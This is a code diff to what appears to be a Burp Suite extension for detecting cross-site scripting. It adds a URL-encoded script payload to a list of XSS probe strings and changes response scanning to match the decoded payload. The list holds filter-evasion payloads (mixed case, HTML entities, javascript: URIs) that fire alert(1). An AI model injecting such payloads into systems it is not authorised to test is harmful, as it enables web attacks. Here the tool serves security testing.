@@ -35,6 +35,7 @@ PAYLOADS = [
     '¼script¾alert(1)¼/script¾',
     '<script>alert`1`</script>',
     '<ScRiPt>alert(1)</sCriPt>',
+    '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
     '<img src=x onerror=&#x22;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;>',
     '<IMG SRC="javascript:alert(1);">',
     '<IMG SRC=JaVaScRiPt:alert(1)>',
@@ -203,11 +204,10 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory):
                 headers = analyzedResponse.getHeaders()
                 body = response[analyzedResponse.getBodyOffset():]
                 body_string = body.tostring()
-                text = body_string.find(self.payload)
-                if text != -1:
+                if body_string.find(urllib.unquote(self.payload)) != -1:
                     new_body_string = body_string.replace(
-                        self.payload,
-                        '<!-- '+PAYLOAD_TAG+' -->'+self.payload
+                        urllib.unquote(self.payload),
+                        '<!-- '+PAYLOAD_TAG+' -->'+urllib.unquote(self.payload)
                     )
                     new_body = self._helpers.bytesToString(new_body_string)
                     messageInfo.setResponse(
